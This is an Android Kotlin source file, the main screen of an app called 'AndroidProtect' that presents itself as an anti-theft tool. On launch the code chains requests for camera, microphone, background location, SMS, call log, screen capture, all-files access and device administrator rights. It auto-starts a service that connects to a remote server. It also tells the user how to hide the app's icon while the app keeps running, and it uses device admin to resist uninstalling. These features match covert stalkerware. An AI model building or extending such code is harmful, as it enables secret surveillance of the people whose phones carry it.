package com.androidprotect

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import java.net.InetAddress
import kotlin.concurrent.thread

class MainActivity : ComponentActivity() {

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private val prefs by lazy { getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE) }

    // ── Composable permission state (observed by UI) ──────────────────────────
    private val hasLocationState    = mutableStateOf(false)
    private val hasBgLocationState  = mutableStateOf(false)
    private val hasCameraState      = mutableStateOf(false)
    private val hasMicState         = mutableStateOf(false)
    private val hasNotifyState      = mutableStateOf(false)
    private val hasScreenState      = mutableStateOf(false)
    private val hasAdminState       = mutableStateOf(false)
    private val hasPhoneState       = mutableStateOf(false)
    private val hasSmsState         = mutableStateOf(false)
    private val hasActivityState    = mutableStateOf(false)

    // ── Launcher 1: Basic permissions (camera, mic, location, notifications) ──
    private val basicPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        // Update observable states
        refreshPermStates()

        // Chain: request background location next if fine location was granted
        if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            !hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        ) {
            Handler(Looper.getMainLooper()).postDelayed({
                bgLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }, 400)
        } else {
            scheduleScreenCaptureRequest()
        }
    }

    // ── Launcher 2: Background location (must be separate per Android policy) ─
    private val bgLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        hasBgLocationState.value = granted
        scheduleScreenCaptureRequest()
    }

    // ── Launcher 3: Screen capture ───────────────────────────────────────────
    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            AntiTheftService.mediaProjectionResultCode = result.resultCode
            AntiTheftService.mediaProjectionData = result.data
            prefs.edit().putBoolean("screen_perm_granted", true).apply()
            hasScreenState.value = true
            Toast.makeText(this, "Transmissão de tela autorizada!", Toast.LENGTH_SHORT).show()
        }
        // If denied: we don't force — user can tap the button in UI
    }

    // Device Admin launcher
    private val adminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { refreshPermStates() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        mediaProjectionManager  = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        devicePolicyManager     = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent          = ComponentName(this, AdminReceiver::class.java)

        // Initial permission state snapshot
        refreshPermStates()

        setContent { AndroidProtectTheme { MainScreen() } }

        // Start the full permission grant flow automatically
        startPermissionFlow()
    }

    override fun onResume() {
        super.onResume()
        // Refresh states whenever user comes back from Settings
        refreshPermStates()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (intent.getBooleanExtra("AUTO_SCREEN_PERM", false)) {
            refreshPermStates()
            if (prefs.getBoolean("screen_perm_granted", false) && AntiTheftService.mediaProjectionData == null) {
                screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
            }
        }
    }

    // ── Main permission flow (auto-sequential) ────────────────────────────────
    private fun startPermissionFlow() {
        val basicNeeded = buildList {
            if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                add(Manifest.permission.ACCESS_FINE_LOCATION)
                add(Manifest.permission.ACCESS_COARSE_LOCATION)
            }
            if (!hasPermission(Manifest.permission.CAMERA))       add(Manifest.permission.CAMERA)
            if (!hasPermission(Manifest.permission.RECORD_AUDIO)) add(Manifest.permission.RECORD_AUDIO)
            if (!hasPermission(Manifest.permission.READ_PHONE_STATE)) add(Manifest.permission.READ_PHONE_STATE)
            if (!hasPermission(Manifest.permission.RECEIVE_SMS))  add(Manifest.permission.RECEIVE_SMS)
            if (!hasPermission(Manifest.permission.READ_SMS))     add(Manifest.permission.READ_SMS)
            if (!hasPermission(Manifest.permission.READ_CALL_LOG))add(Manifest.permission.READ_CALL_LOG)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                !hasPermission(Manifest.permission.ACTIVITY_RECOGNITION)
            ) add(Manifest.permission.ACTIVITY_RECOGNITION)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                !hasPermission(Manifest.permission.POST_NOTIFICATIONS)
            ) add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (basicNeeded.isNotEmpty()) {
            // Small delay so activity is fully resumed before showing dialog
            Handler(Looper.getMainLooper()).postDelayed({
                basicPermLauncher.launch(basicNeeded.toTypedArray())
            }, 500)
        } else {
            // All basic perms already granted — check background + screen
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                !hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            ) {
                Handler(Looper.getMainLooper()).postDelayed({
                    bgLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                }, 500)
            } else {
                scheduleScreenCaptureRequest()
            }
        }
    }

    private fun scheduleScreenCaptureRequest(extraDelayMs: Long = 600) {
        Handler(Looper.getMainLooper()).postDelayed({
            val granted = prefs.getBoolean("screen_perm_granted", false)
            if (!granted) {
                // First time: request screen capture
                screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
            } else if (AntiTheftService.mediaProjectionData == null) {
                // Token expired (process restarted): auto-reactivate silently
                screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
            }
        }, extraDelayMs)
    }

    private fun refreshPermStates() {
        hasLocationState.value   = hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
        hasBgLocationState.value = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) else true
        hasCameraState.value     = hasPermission(Manifest.permission.CAMERA)
        hasMicState.value        = hasPermission(Manifest.permission.RECORD_AUDIO)
        hasNotifyState.value     = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            hasPermission(Manifest.permission.POST_NOTIFICATIONS) else true
        hasScreenState.value     = prefs.getBoolean("screen_perm_granted", false) &&
                AntiTheftService.mediaProjectionData != null
        hasAdminState.value      = devicePolicyManager.isAdminActive(adminComponent)
        hasPhoneState.value      = hasPermission(Manifest.permission.READ_PHONE_STATE)
        hasSmsState.value        = hasPermission(Manifest.permission.RECEIVE_SMS)
        hasActivityState.value   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            hasPermission(Manifest.permission.ACTIVITY_RECOGNITION) else true
    }

    private fun hasPermission(p: String) =
        ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED

    private fun openAppSettings() {
        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        })
    }

    // ── Composable UI ─────────────────────────────────────────────────────────
    @Composable
    fun MainScreen() {
        val context = this
        val deviceId = remember {
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "Desconhecido"
        }

        var serverIp by remember {
            mutableStateOf(prefs.getString("server_ip", "protect.appbr.pro") ?: "protect.appbr.pro")
        }
        var linkToken by remember {
            mutableStateOf(prefs.getString("link_token", "") ?: "")
        }
        val defaultHwName = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
        var deviceName by remember {
            mutableStateOf(prefs.getString("device_custom_name", "") ?: "")
        }
        var isServiceActive by remember { mutableStateOf(AntiTheftService.isServiceRunning) }
        var testResult     by remember { mutableStateOf<String?>(null) }
        var isTesting      by remember { mutableStateOf(false) }

        // Observe permission states
        val hasLocation   by hasLocationState
        val hasBgLocation by hasBgLocationState
        val hasCamera     by hasCameraState
        val hasMic        by hasMicState
        val hasNotify     by hasNotifyState
        val hasScreen     by hasScreenState
        val hasAdmin      by hasAdminState
        val hasPhone      by hasPhoneState
        val hasSms        by hasSmsState
        val hasActivity   by hasActivityState
        val hasAllFiles   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
            android.os.Environment.isExternalStorageManager() else true

        val isBatteryOptimized = isBatteryOptimizedFor(context)

        // Auto-start service on first compose
        LaunchedEffect(Unit) {
            AntiTheftService.serverIpAddress = serverIp
            AntiTheftService.linkToken = prefs.getString("link_token", "") ?: ""
            val autoStart = prefs.getBoolean("auto_start", true)
            if (autoStart && !AntiTheftService.isServiceRunning) {
                startService(serverIp)
                isServiceActive = true
            }
        }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Color(0xFF0A0B10))
                .verticalScroll(rememberScrollState())
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Spacer(Modifier.height(20.dp))

            Text("AndroidProtect", fontSize = 32.sp, fontWeight = FontWeight.Bold, color = Color(0xFF00D2FF))
            Text(
                "Painel de Configuração de Segurança",
                color = Color(0xFF8E94A5), fontSize = 14.sp,
                modifier = Modifier.padding(top = 4.dp, bottom = 24.dp)
            )

            // ── Status card ────────────────────────────────────────────────
            SectionCard {
                Label("STATUS DO DISPOSITIVO")
                Spacer(Modifier.height(12.dp))
                Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween, Alignment.CenterVertically) {
                    Column {
                        Text("ID do Aparelho:", color = Color.White, fontSize = 13.sp)
                        Text(deviceId, color = Color(0xFF00D2FF), fontSize = 15.sp, fontWeight = FontWeight.SemiBold)
                    }
                    StatusBadge(isServiceActive)
                }
            }

            // ── Link token card ────────────────────────────────────────────
            SectionCard {
                Label("CÓDIGO DE VINCULAÇÃO")
                Spacer(Modifier.height(10.dp))
                Text(
                    "Cole aqui o código exibido no painel web após o cadastro.\nO aparelho será vinculado à sua conta automaticamente.",
                    color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
                OutlinedTextField(
                    value = linkToken,
                    onValueChange = { v ->
                        val clean = v.uppercase().replace("[^A-Z0-9-]".toRegex(), "").take(9)
                        linkToken = clean
                        AntiTheftService.linkToken = clean
                        prefs.edit().putString("link_token", clean).apply()
                    },
                    label = { Text("Ex: ABCD-1234") },
                    placeholder = { Text("XXXX-XXXX") },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true,
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color(0xFF00D2FF),
                        unfocusedBorderColor = if (linkToken.length == 9) Color(0xFF39FF14) else Color(0xFF252630),
                        focusedLabelColor = Color(0xFF00D2FF),
                        cursorColor = Color(0xFF00D2FF),
                        focusedTextColor = Color.White, unfocusedTextColor = Color.White
                    )
                )
                if (linkToken.length == 9) {
                    Spacer(Modifier.height(8.dp))
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(16.dp))
                        Spacer(Modifier.width(6.dp))
                        Text("Código válido — aparelho será vinculado ao conectar.", color = Color(0xFF39FF14), fontSize = 11.sp)
                    }
                }
            }

            // ── Device name card ──────────────────────────────────────────
            SectionCard {
                Label("NOME DO DISPOSITIVO")
                Spacer(Modifier.height(8.dp))
                Text(
                    "Dê um nome para identificar este celular no painel (ex: Celular da Maria, iPhone do João).",
                    color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
                OutlinedTextField(
                    value = deviceName,
                    onValueChange = { deviceName = it },
                    label = { Text("Nome personalizado (opcional)") },
                    placeholder = { Text(defaultHwName) },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true,
                    colors = neonOutlinedColors(),
                    trailingIcon = {
                        if (deviceName.isNotEmpty()) {
                            androidx.compose.material3.IconButton(onClick = {
                                deviceName = ""
                                prefs.edit().remove("device_custom_name").apply()
                                AntiTheftService.currentModelName = defaultHwName
                            }) {
                                Icon(
                                    imageVector = Icons.Default.CheckCircle,
                                    contentDescription = "Limpar",
                                    tint = Color(0xFF8E94A5)
                                )
                            }
                        }
                    }
                )
                Spacer(Modifier.height(10.dp))
                Button(
                    onClick = {
                        val trimmed = deviceName.trim()
                        prefs.edit().putString("device_custom_name", trimmed).apply()
                        AntiTheftService.currentModelName = trimmed.ifEmpty { defaultHwName }
                        // Notify running service to reconnect with new name
                        val intent = Intent(context, AntiTheftService::class.java)
                            .putExtra("DEVICE_NAME", AntiTheftService.currentModelName)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                            context.startForegroundService(intent)
                        else context.startService(intent)
                        Toast.makeText(
                            context,
                            if (trimmed.isEmpty()) "Nome redefinido para padrão."
                            else "Nome salvo: $trimmed",
                            Toast.LENGTH_SHORT
                        ).show()
                    },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                ) {
                    Text(
                        if (deviceName.trim().isEmpty()) "Usar nome padrão do hardware"
                        else "💾  Salvar Nome",
                        color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold
                    )
                }
                Spacer(Modifier.height(6.dp))
                Text(
                    "Atual: ${prefs.getString("device_custom_name","").let { if (it.isNullOrBlank()) defaultHwName else it }}",
                    color = Color(0xFF8E94A5), fontSize = 11.sp
                )
            }

            // ── Server config card ─────────────────────────────────────────
            SectionCard {
                Label("ENDEREÇO DO SERVIDOR")
                Spacer(Modifier.height(16.dp))
                OutlinedTextField(
                    value = serverIp, onValueChange = { serverIp = it },
                    label = { Text("IP ou Domínio do Servidor") },
                    placeholder = { Text("Ex: protect.appbr.pro") },
                    modifier = Modifier.fillMaxWidth(),
                    colors = neonOutlinedColors()
                )
                Spacer(Modifier.height(16.dp))
                Row(Modifier.fillMaxWidth(), Arrangement.spacedBy(12.dp)) {
                    OutlinedButton(
                        onClick = {
                            isTesting = true; testResult = null
                            thread {
                                testResult = try {
                                    val ok = InetAddress.getByName(serverIp).isReachable(3000)
                                    if (ok) "Conexão OK!" else "Servidor inalcançável."
                                } catch (e: Exception) { "Erro: ${e.message}" }
                                isTesting = false
                            }
                        },
                        modifier = Modifier.weight(1f),
                        enabled = !isTesting && serverIp.isNotBlank(),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF00D2FF))
                    ) { Text(if (isTesting) "Testando..." else "Testar Conexão") }

                    Button(
                        onClick = {
                            AntiTheftService.serverIpAddress = serverIp
                            prefs.edit().putString("server_ip", serverIp).putBoolean("auto_start", !isServiceActive).apply()
                            if (isServiceActive) {
                                stopService(Intent(context, AntiTheftService::class.java))
                                isServiceActive = false
                            } else {
                                startService(serverIp); isServiceActive = true
                            }
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isServiceActive) Color(0xFFFF3838) else Color(0xFF00D2FF)
                        )
                    ) {
                        Text(
                            if (isServiceActive) "Parar Serviço" else "Iniciar Serviço",
                            color = if (isServiceActive) Color.White else Color(0xFF0A0B10),
                            fontWeight = FontWeight.Bold
                        )
                    }
                }
                testResult?.let {
                    Spacer(Modifier.height(10.dp))
                    Text(
                        it, color = if (it.contains("OK")) Color(0xFF39FF14) else Color(0xFFFF3838),
                        fontSize = 13.sp, fontWeight = FontWeight.Medium,
                        modifier = Modifier.align(Alignment.CenterHorizontally)
                    )
                }
            }

            // ── Quick presets ──────────────────────────────────────────────
            SectionCard {
                Label("ATALHOS DE CONEXÃO RÁPIDA")
                Spacer(Modifier.height(12.dp))
                Row(Modifier.fillMaxWidth(), Arrangement.spacedBy(12.dp)) {
                    Button(
                        onClick = { applyServer("protect.appbr.pro", serverIp) { serverIp = it; isServiceActive = true } },
                        modifier = Modifier.weight(1f), shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                    ) { Text("Servidor Oficial", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 12.sp) }

                    OutlinedButton(
                        onClick = { applyServer("10.0.2.2", serverIp) { serverIp = it; isServiceActive = true } },
                        modifier = Modifier.weight(1f), shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFFF2A85))
                    ) { Text("Servidor Local", fontWeight = FontWeight.Bold, fontSize = 12.sp) }
                }
            }

            // ── Permissions card ───────────────────────────────────────────
            SectionCard {
                Label("CENTRAL DE PERMISSÕES")
                Spacer(Modifier.height(4.dp))
                Text(
                    "Todas as permissões são solicitadas automaticamente.\nSe alguma estiver bloqueada, toque em 'Abrir Configurações'.",
                    color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp,
                    modifier = Modifier.padding(bottom = 14.dp)
                )

                PermRow("GPS (Localização)", hasLocation)
                PermRow("Localização em Segundo Plano", hasBgLocation)
                PermRow("Câmera", hasCamera)
                PermRow("Microfone / Áudio", hasMic)
                PermRow("Estado do Telefone (IMEI/SIM)", hasPhone)
                PermRow("Receber SMS (backup sem internet)", hasSms)
                PermRow("Reconhecimento de Movimento", hasActivity)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    PermRow("Notificações", hasNotify)
                }
                PermRow("Transmissão de Tela", hasScreen)
                PermRow("Administrador do Dispositivo", hasAdmin)
                PermRow("Acesso a Todos os Arquivos", hasAllFiles)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    PermRow("Sem otimização de bateria (conexão estável)", !isBatteryOptimized)
                }

                val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
                        hasPhone && hasSms && hasActivity && hasNotify && hasScreen && hasAdmin &&
                        hasAllFiles && !isBatteryOptimized
                Spacer(Modifier.height(14.dp))

                if (!allGranted) {
                    // Battery optimization — CRITICAL for stable WebSocket connection
                    if (isBatteryOptimized && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        Button(
                            onClick = {
                                val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                                    data = android.net.Uri.parse("package:${context.packageName}")
                                }
                                context.startActivity(intent)
                            },
                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF39FF14))
                        ) {
                            Text(
                                "⚡  Desativar Otimização de Bateria (evita desconexões)",
                                color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 12.sp
                            )
                        }
                    }

                    // Manage all files (Android 11+)
                    if (!hasAllFiles && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        Button(
                            onClick = {
                                startActivity(Intent(android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                            },
                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                        ) {
                            Text("📂  Permitir Acesso a Todos os Arquivos", color = Color(0xFF0A0B10),
                                fontWeight = FontWeight.Bold, fontSize = 12.sp)
                        }
                    }

                    // Device Admin activation button (separate system flow)
                    if (!hasAdmin) {
                        Button(
                            onClick = {
                                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                        "Ativa proteção contra desinstalação e permite bloqueio/limpeza remota do aparelho.")
                                }
                                adminLauncher.launch(intent)
                            },
                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9900))
                        ) {
                            Text("⚙️  Ativar Administrador do Dispositivo", color = Color.Black,
                                fontWeight = FontWeight.Bold, fontSize = 12.sp)
                        }
                    }

                    Row(Modifier.fillMaxWidth(), Arrangement.spacedBy(10.dp)) {
                        OutlinedButton(
                            onClick = { startPermissionFlow() },
                            modifier = Modifier.weight(1f), shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF00D2FF))
                        ) { Text("Solicitar Novamente", fontSize = 12.sp) }

                        Button(
                            onClick = { openAppSettings() },
                            modifier = Modifier.weight(1f), shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF2A85))
                        ) { Text("Abrir Configurações", fontSize = 12.sp) }
                    }
                } else {
                    Box(
                        Modifier
                            .fillMaxWidth()
                            .background(Color(0xFF1A2E1A), RoundedCornerShape(12.dp))
                            .padding(14.dp),
                        Alignment.Center
                    ) {
                        Text(
                            "✅  Todas as permissões concedidas. App pronto!",
                            color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp
                        )
                    }
                }
            }

            // ── How to hide app ────────────────────────────────────────────
            SectionCard {
                Label("COMO ESCONDER O APLICATIVO")
                Spacer(Modifier.height(10.dp))
                Text(
                    "Mantenha pressionada a tela inicial → Configurações → 'Ocultar aplicativos' → selecione AndroidProtect → Aplicar.\n\nO app continua rodando mesmo sem o ícone visível.",
                    color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 18.sp,
                    modifier = Modifier.padding(bottom = 14.dp)
                )
                Button(
                    onClick = { openAppSettings() },
                    modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF2A85))
                ) { Text("Configurações do Sistema", color = Color.White, fontWeight = FontWeight.Bold) }
            }

            Spacer(Modifier.height(24.dp))
        }
    }

    // ── Helper composables ────────────────────────────────────────────────────
    @Composable
    fun SectionCard(content: @Composable ColumnScope.() -> Unit) {
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 20.dp)
                .border(1.dp, Color(0xFF252630), RoundedCornerShape(16.dp)),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF12141D)),
            shape = RoundedCornerShape(16.dp)
        ) { Column(Modifier.padding(20.dp), content = content) }
    }

    @Composable
    fun Label(text: String) =
        Text(text, fontSize = 11.sp, color = Color(0xFF8E94A5), fontWeight = FontWeight.Bold, letterSpacing = 1.sp)

    @Composable
    fun StatusBadge(active: Boolean) =
        Box(
            Modifier
                .background(if (active) Color(0xFF1E3A24) else Color(0xFF3A1E24), RoundedCornerShape(50.dp))
                .padding(horizontal = 14.dp, vertical = 6.dp)
        ) {
            Text(
                if (active) "ATIVO" else "INATIVO",
                color = if (active) Color(0xFF39FF14) else Color(0xFFFF3838),
                fontSize = 11.sp, fontWeight = FontWeight.Bold
            )
        }

    @Composable
    fun PermRow(label: String, granted: Boolean) {
        Row(
            Modifier.fillMaxWidth().padding(vertical = 7.dp),
            Arrangement.SpaceBetween, Alignment.CenterVertically
        ) {
            Text(label, color = Color.White, fontSize = 14.sp)
            if (granted) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(17.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("OK", color = Color(0xFF39FF14), fontSize = 12.sp, fontWeight = FontWeight.Bold)
                }
            } else {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Warning, null, tint = Color(0xFFFF9900), modifier = Modifier.size(17.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("Pendente", color = Color(0xFFFF9900), fontSize = 12.sp)
                }
            }
        }
    }

    @Composable
    fun neonOutlinedColors() = OutlinedTextFieldDefaults.colors(
        focusedBorderColor = Color(0xFF00D2FF), unfocusedBorderColor = Color(0xFF252630),
        focusedLabelColor = Color(0xFF00D2FF), cursorColor = Color(0xFF00D2FF),
        focusedTextColor = Color.White, unfocusedTextColor = Color.White
    )

    // ── Helpers ───────────────────────────────────────────────────────────────
    private fun startService(ip: String) {
        AntiTheftService.serverIpAddress = ip
        AntiTheftService.linkToken = prefs.getString("link_token", "") ?: ""
        prefs.edit().putString("server_ip", ip).putBoolean("auto_start", true).apply()
        val intent = Intent(this, AntiTheftService::class.java).putExtra("SERVER_IP", ip)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        } catch (e: Exception) { Log.e("MainActivity", "Start service failed: ${e.message}") }
    }

    private fun applyServer(ip: String, current: String, onDone: (String) -> Unit) {
        AntiTheftService.serverIpAddress = ip
        prefs.edit().putString("server_ip", ip).putBoolean("auto_start", true).apply()
        startService(ip)
        onDone(ip)
        Toast.makeText(this, "Conectado: $ip", Toast.LENGTH_SHORT).show()
    }
}

fun isBatteryOptimizedFor(context: android.content.Context): Boolean {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        val pm = context.getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
        return !pm.isIgnoringBatteryOptimizations(context.packageName)
    }
    return false // below Android M → no battery optimization restriction
}

@Composable
fun AndroidProtectTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = Color(0xFF00D2FF), secondary = Color(0xFFFF2A85),
            background = Color(0xFF0A0B10), surface = Color(0xFF12141D)
        ),
        content = content
    )
}
